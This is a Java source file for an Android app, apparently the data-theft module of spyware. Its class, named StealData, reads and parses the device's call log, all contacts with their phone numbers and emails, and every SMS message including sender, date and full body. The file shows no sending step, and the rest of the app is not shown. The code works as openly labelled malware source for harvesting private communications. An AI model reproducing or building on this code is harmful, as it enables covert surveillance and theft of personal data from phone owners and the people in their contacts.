package com.redactedlabs.yoshimi;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

public class StealData {

	public static RecentCall[] getCalls(Context act){
		/* Get the Call Log - Parse the Calls - Put them in in a RecentCall Data Structure */
		Cursor retrievedCalls = APIInteraction.retrieveCalls(act);
		RecentCall[] callList = createCallList(retrievedCalls);	
		retrievedCalls.close();
		return callList == null ? null:callList;
	}
	
	public static ContactsList[] getContacts(Context act){
		/* Get the Contacts - Parse the Contacts - Put them in in a ContactsList Data Structure */
		Cursor retrievedContacts = APIInteraction.retrieveContacts(act);
		ContactsList[] contactList = createContactList(retrievedContacts, act);	
		retrievedContacts.close();
		if(contactList == null){
			return null;
		}
		else{
			return contactList;
		}	
	}
	
	public static SMSList[] getSMSMessages(Context act){
		/* Get the Contacts - Parse the Contacts - Put them in in a ContactsList Data Structure */
		Cursor retrievedSMS = APIInteraction.retrieveSMS(act);
		SMSList[] smsList = createSMSList(retrievedSMS, act);	
		retrievedSMS.close();
		if(smsList == null){
			return null;
		}
		else{
			return smsList;
		}	
	}
	
	private static RecentCall[] createCallList(Cursor retrievedCalls){
		// get start of cursor
				if(retrievedCalls.moveToFirst()){
				 
				  // loop through cursor 
					int callsIndex = 0;
					RecentCall[] callsList = new RecentCall[retrievedCalls.getCount()];
					for(int i=0;i<retrievedCalls.getCount();i++){
						callsList[i] = new RecentCall();
					}
					  do{
						  //Store the data in a CallLogObject
					  
						  // DEBUG CODE
						  //Get Phone Number
						  String number = retrievedCalls.getString(0);
						  System.out.println(number);

						  //Get Call Type
						  int calltype = retrievedCalls.getInt(1);
						  String stringCallType = identifyCallType(calltype);
						  System.out.println(stringCallType);

						  //Get Associated Name from Phonebook ... IF available
						  String cacheName = retrievedCalls.getString(2);
						  if(cacheName == null){
							  cacheName = "Not Available";
							  System.out.println(cacheName);
						  }
						  else{
							  System.out.println(cacheName);
						  }
						  
						  int numberType = retrievedCalls.getInt(3);
						  String stringNumberType = identifyPhoneNumberType(numberType);	  
						  System.out.println(stringNumberType);
						  // END DEBUG CODE
						  
						  //System.out.println("Number of Entries: "+mCallCursor.getCount());
						  
						  //Put the data in the Object
						  callsList[callsIndex].setPhoneNumber(number);
						  callsList[callsIndex].setCallType(stringCallType);
						  callsList[callsIndex].setName(cacheName);
						  callsList[callsIndex].setNumberType(stringNumberType);
						  
						  callsIndex++;
					 
					  } while (retrievedCalls.moveToNext());
					  return callsList;
				 
				}
				else{
					return null;
				}
		
		
	}
	
	private static String identifyCallType(int calltype){
		String stringCallType = "";
		if(calltype == 1){stringCallType = "Incoming";}
		else if (calltype == 2) {stringCallType = "Outgoing";}
		else if (calltype == 3) {stringCallType = "Missed";}
		return stringCallType;
	}
	
	private static String identifyPhoneNumberType(int numberType){
		String stringnumberType = "";	  
		  switch(numberType){
			  case 0:  stringnumberType = "Custom";
	        break;
			  case 1:  stringnumberType = "Home";
	        break;
			  case 2:  stringnumberType = "Mobile";
	        break;
			  case 3:  stringnumberType = "Work";
	        break;
			  case 4:  stringnumberType = "Fax Work";
	        break;
			  case 5:  stringnumberType = "Fax Home";
	        break;
			  case 6:  stringnumberType = "Pager";
	        break;
			  case 7:  stringnumberType = "Other";
	        break;
			  default: stringnumberType = "Unidentified";
	           break;
		  }
		return stringnumberType;
	}

	private static ContactsList[] createContactList(Cursor retrievedContacts, Context currentContext){
		
		// get start of cursor
		if(retrievedContacts.moveToFirst()){
			
			// loop through cursor 
			int contactsIndex = 0;
			
			//Declare ContactsList and Initialize 
			ContactsList[] contactList = new ContactsList[retrievedContacts.getCount()];
			for(int i=0;i<retrievedContacts.getCount();i++){
				contactList[i] = new ContactsList();
			}
			  do{
				   String contactId = retrievedContacts.getString(retrievedContacts.getColumnIndex( 
				   ContactsContract.Contacts._ID));
				   System.out.println(contactId);
				   
				   //Get's the Contact Name
				   String contactName = retrievedContacts.getString(retrievedContacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				   System.out.println(contactName);
				   
				   
				   int hasPhone = retrievedContacts.getInt(retrievedContacts.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));  
				   String phoneNumbers = "";
				   				   
				   if (hasPhone == 1) { 
				      // You know it has a number so now query
				      Cursor phones = APIInteraction.retrievePhoneNumbers(contactId, currentContext);
				      while (phones.moveToNext()) { 
				         phoneNumbers = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) + ";" + phoneNumbers;                 
				      } 
				      phones.close(); 
				   }
				   System.out.println(phoneNumbers);
						
				   Cursor emails = APIInteraction.retrieveEmailContacts(contactId, currentContext);
				   //retrieveEmailContacts will return null if none are found...
				   String emailAddresses = "";
				   if(emails != null){
						while (emails.moveToNext()) { 
						   // This would allow you get several email addresses 
						   emailAddresses = emails.getString(emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)) + ";" + emailAddresses; 
						} 
						emails.close();
					}
				   System.out.println(emailAddresses);
					
					//Put the data in the Object
					contactList[contactsIndex].setContactName(contactName);
					contactList[contactsIndex].setPhoneNumber(phoneNumbers);
					contactList[contactsIndex].setEmail(emailAddresses);
					  
					contactsIndex++;
				 
					
			  }while(retrievedContacts.moveToNext());
			retrievedContacts.close();
			return contactList;
		}
		else{
			return null;
		}
				
	}
	
	private static SMSList[] createSMSList(Cursor retrievedSMS, Context currentContext){
		
		// get start of cursor
		if(retrievedSMS.moveToFirst()){
			
			// loop through cursor 
			int smsIndex = 0;
			
			//Declare ContactsList and Initialize 
			SMSList[] smsList = new SMSList[retrievedSMS.getCount()];
			for(int i=0;i<retrievedSMS.getCount();i++){
				smsList[i] = new SMSList();
			}
			  do{
				  
				  String person = retrievedSMS.getString(retrievedSMS.getColumnIndex("person"));
				  String contactName = "";
				  if(person != null){
					// If we have someone in our contacts list associated with the SMS ... get the name
					  contactName = APIInteraction.retrieveContactName(person, currentContext);
				  	System.out.println("Associated Contact: "+contactName);
				  }
				  else{
					  contactName ="Unavailable";
				  }
				  
				  String phoneNumber = retrievedSMS.getString(retrievedSMS.getColumnIndex("address"));
				  System.out.println("Phone Number: "+phoneNumber);
				  
				  int type = retrievedSMS.getInt(retrievedSMS.getColumnIndex("type"));
				  String messageType = identifySMSType(type);
				  System.out.println("Message Type: "+messageType);
				  
				  String messageDate = retrievedSMS.getString(retrievedSMS.getColumnIndex("date"));
				  System.out.println("Date of Message: "+messageDate);
				  
				  String messageBody = retrievedSMS.getString(retrievedSMS.getColumnIndex("body"));
				  System.out.println("Message Body: "+messageBody);

				  String messageRead = retrievedSMS.getString(retrievedSMS.getColumnIndex("read"));
				  if(messageRead == "1"){
					  messageRead = "Yes";
				  }
				  else{
					  messageRead = "No";
				  }
				  System.out.println("Has been read: "+messageRead);
				  
				  //Put the data in the Object
				  smsList[smsIndex].setContactName(contactName);
				  smsList[smsIndex].setPhoneNumber(phoneNumber);
				  smsList[smsIndex].setMessageDate(messageDate);
				  smsList[smsIndex].setMessageType(messageType);
				  smsList[smsIndex].setMessageBody(messageBody);
				  smsList[smsIndex].setMessageRead(messageRead);
				  
				  smsIndex++;
				  
			  }while(retrievedSMS.moveToNext());
			  retrievedSMS.close();
				return smsList;
		}
		else{
			return null;
		}
	}	
	
	private static String identifySMSType(int messageType){
		String stringMessageType = "";	  
		  switch(messageType){
			  case 0:  stringMessageType = "All";
			  	break;
			  case 1:  stringMessageType = "Inbox";
			  	break;
			  case 2:  stringMessageType = "Sent";
			  	break;
			  case 3:  stringMessageType = "Drafts";
			  	break;
			  case 4:  stringMessageType = "Outbox";
			  	break;
			  case 5:  stringMessageType = "Failed";
			  	break;
			  case 6:  stringMessageType = "Queued";
			  	break;
			  default: stringMessageType = "Unidentified";
	          	break;
		  }
		return stringMessageType;
	}
}
